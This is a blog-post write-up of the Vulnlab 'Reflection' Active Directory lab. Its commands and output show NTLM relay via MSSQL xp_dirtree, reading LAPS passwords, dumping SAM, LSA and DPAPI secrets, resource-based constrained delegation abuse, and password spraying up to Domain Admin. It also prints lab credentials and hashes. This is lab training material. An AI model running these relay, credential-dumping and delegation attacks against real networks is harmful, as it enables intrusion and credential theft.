---
layout: post
title: "Reflection - Vulnlab"
date: 2025-11-13
categories: [Writeups, Vulnlab]
tags: [Active Directory, NTLM Relay, RBCD, LAPS, Privilege Escalation, Windows]
difficulty: Medium
image:
  path: assets/lib/reflection.png
  alt: Reflection Vulnlab Banner
---

## Introduction

Reflection is a medium-difficulty Active Directory chain from Vulnlab. The path to domain admin involves NTLM relay attacks, LAPS abuse, Resource-Based Constrained Delegation, and good old password spraying. We'll be pivoting through three machines: DC01 (Domain Controller), WS01 (Workstation), and MS01 (Member Server).

---

## Initial Reconnaissance

Starting with some basic port scans to see what we're working with:

**DC01**

```
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

**WS01**

```
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

**MS01**

```
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

Pretty standard AD environment. DC has MSSQL running, which is interesting. Let's start poking around.

---

## Getting Initial Access

### Finding Database Credentials

We started by checking out SMB shares on MS01 with anonymous access. Found something called `staging`:

![MS01 shares](assets\lib\screen1.png)

```
└─# smbclient.py reflection.vl/aa:@MS01.reflection.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
staging
# use staging
# ls
drw-rw-rw-          0  Thu Jun  8 07:21:36 2023 .
drw-rw-rw-          0  Wed Jun  7 13:41:25 2023 ..
-rw-rw-rw-         50  Thu Jun  8 07:21:49 2023 staging_db.conf
# get staging_db.conf
```

The file contained database credentials:

```
└─# cat staging_db.conf 
user=web_staging
password=Washroom510
db=staging
```

These worked on the MSSQL instance running on MS01!

![mssql creds](assets\lib\screen2.png)

### NTLM Relay Attack

We could use `xp_dirtree` to capture the service account hash, but cracking it didn't work out. Time for plan B: NTLM relay.

![mssql](assets\lib\screen3.png)

![Responder](assets\lib\screen4.png)

First, we needed to check if SMB signing was disabled on the targets:

![SMB signing check](assets\lib\screen5.png)

Perfect! All three machines have SMB signing disabled. Now we could set up ntlmrelayx with SOCKS support to relay the authentication to the DC:

```
└─# ntlmrelayx.py -t smb://10.10.197.69 -smb2support -socks -i
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections
```

I triggered the authentication using `xp_dirtree` from MSSQL:

```
[*] (SMB): Received connection from 10.10.197.70, attacking target smb://10.10.197.69
[*] (SMB): Authenticating connection from REFLECTION/SVC_WEB_STAGING@10.10.197.70 against smb://10.10.197.69 SUCCEED
[*] SOCKS: Adding SMB://REFLECTION/SVC_WEB_STAGING@10.10.197.69(445) to active SOCKS connection. Enjoy
```

Now we had the SVC_WEB_STAGING account relayed to the DC through the SOCKS proxy.

### Accessing Production Database Credentials

Using proxychains with the active SOCKS connection, We accessed the DC's shares:

```
┌──(root㉿kali)-[/opt/reflection]
└─# proxychains4 -q smbclient.py REFLECTION/SVC_WEB_STAGING@10.10.197.69 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
# use prod
# ls
drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .
drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf
# get prod_db.conf
```

Found another config file with production credentials:

```
┌──(root㉿kali)-[/opt/reflection]
└─# cat prod_db.conf 
user=web_prod
password=Tribesman201
db=prod
```

### Extracting User Credentials from Database

These production credentials gave us access to the MSSQL instance on the DC:

![mssql 2](assets\lib\screen6.png)

```
┌──(root㉿kali)-[/opt/reflection]
└─# mssqlclient.py web_prod:Tribesman201@10.10.197.69 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (web_prod  dbo@prod)> SELECT name FROM sys.tables;
name    
-----   
users   
SQL (web_prod  dbo@prod)> select * from users;
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   
 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'
```

Sweet! Got two domain user credentials. Let's verify they work:

![Domain auth](assets\lib\screen7.png)

Both accounts are valid domain users. Time to see what they can do.

---

## Lateral Movement to MS01

### BloodHound Enumeration

I collected AD data using both nxc and rusthound-ce for a complete picture:

```
nxc ldap 10.10.197.69 -u 'dorothy.rose' -p 'hC_fny3OK9glSJ' --bloodhound -c all --dns-server 10.10.197.69

rusthound-ce -d reflection.vl -z -u 'dorothy.rose' -p 'hC_fny3OK9glSJ'
```

Looking at the ACLs in BloodHound, we found that **abbie.smith** has **GenericAll** permissions on **MS01**:

![Domain auth](assets\lib\screen9.png)

GenericAll means we can read the LAPS password for MS01.

Now we can read the first flag 


### Extracting LAPS Password

```
└─# nxc ldap 10.10.197.69 -u 'abbie.smith' -p 'CMe1x+nlRaaWEw' -M laps
```

![LAPS](assets\lib\laps.png)


![flag](assets\lib\flag1.png)


Got the local administrator password for MS01: `H447.++h6g5}xi`

### Dumping MS01 Credentials

Now that we had local admin on MS01, we dumped lsa:

```
└─# nxc smb 10.10.197.70 -u Administrator -p 'H447.++h6g5}xi' --local-auth --sam --dpapi --ntds
SMB         10.10.197.70    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:None)
SMB         10.10.197.70    445    MS01             [+] MS01\Administrator:H447.++h6g5}xi (Pwn3d!)
SMB         10.10.197.70    445    MS01             [*] Dumping SAM hashes
SMB         10.10.197.70    445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:3819a8ecec5fd33f6ecb83253b24309a:::
SMB         10.10.197.70    445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.197.70    445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.197.70    445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bb5d8648678f590b8b3051e24a985345:::
SMB         10.10.197.70    445    MS01             labadm:1000:aad3b435b51404eeaad3b435b51404ee:2a50f9a04b270a24fcd474092ebd9c8e:::
SMB         10.10.197.70    445    MS01             [+] Added 5 SAM hashes to the database
SMB         10.10.197.70    445    MS01             [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         10.10.197.70    445    MS01             [+] Got 7 decrypted masterkeys. Looting secrets...
SMB         10.10.197.70    445    MS01             [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} - REFLECTION\Georgia.Price:DBl+5MPkpJg5id
```

 Found domain credentials in the DPAPI vault: **Georgia.Price:DBl+5MPkpJg5id**

---

## Lateral Movement to WS01

### Analyzing Georgia.Price's Permissions

Back to BloodHound to see what Georgia.Price can do. She has **GenericAll** on **WS01**:

![Domain auth](assets\lib\ace.png)

There's no LAPS on WS01, so I'll need to use a different approach. RBCD attack it is!

### The MAQ=0 Problem

One small issue: the domain's MachineAccountQuota (MAQ) is set to 0, which means we can't create new computer accounts for a traditional RBCD attack. But since we have local admin on MS01, we can use the MS01$ computer account instead.

### Configuring RBCD



Now I configured RBCD to allow MS01$ to impersonate users on WS01$:

```
┌──(root㉿kali)-[/opt/reflection]
└─# rbcd.py -delegate-from 'MS01 -delegate-to 'WS01 -dc-ip 10.10.197.69 -action write reflection.vl/Georgia.Price:'DBl+5MPkpJg5id'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```

### Impersonating Administrator on WS01

With RBCD configured, we requested a service ticket for Administrator on WS01:

```
┌──(root㉿kali)-[/opt/reflection]
└─# getST.py -spn cifs/WS01.reflection.vl -impersonate Administrator -dc-ip 10.10.197.69 'reflection.vl/MS01 -hashes :011373d6b1b0fb55fca7970cf8465dfb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache
```

Exported the ticket and accessed WS01:

```
└─# export KRB5CCNAME=Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache

└─# nxc smb 10.10.197.71 -k --use-kcache --lsa
SMB         10.10.197.71    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:None)
SMB         10.10.197.71    445    WS01             [+] reflection.vl\Administrator from ccache (Pwn3d!)
SMB         10.10.197.71    445    WS01             [+] Dumping LSA secrets
SMB         10.10.197.71    445    WS01             REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763240eaa4c0e3d: (2023-06-08 11:17:05)
SMB         10.10.197.71    445    WS01             REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:f012b86daf3675365d9e698f66827f0a:::
SMB         10.10.197.71    445    WS01             reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP
SMB         10.10.197.71    445    WS01             dpapi_machinekey:0xe7b434bbb2fe36946ecafdfab07d4396c039c6e8
dpapi_userkey:0xf772db3cfa86d2d96caf0fc57946c6e7c17511eb
SMB         10.10.197.71    445    WS01             [+] Dumped 5 LSA secrets
```

Found another set of credentials: **Rhys.Garner:knh1gJ8Xmeq+uP**

---

## Domain Compromise

### Password Spraying

With the password `knh1gJ8Xmeq+uP`, we tried spraying it across all domain users:

![Pwned](assets\lib\pwned.png)

The password was reused by **dom_rgarner**, who turned out to be a Domain Admin!

We get the root flag 

![Root](assets\lib\root.png)


Thanks for reading!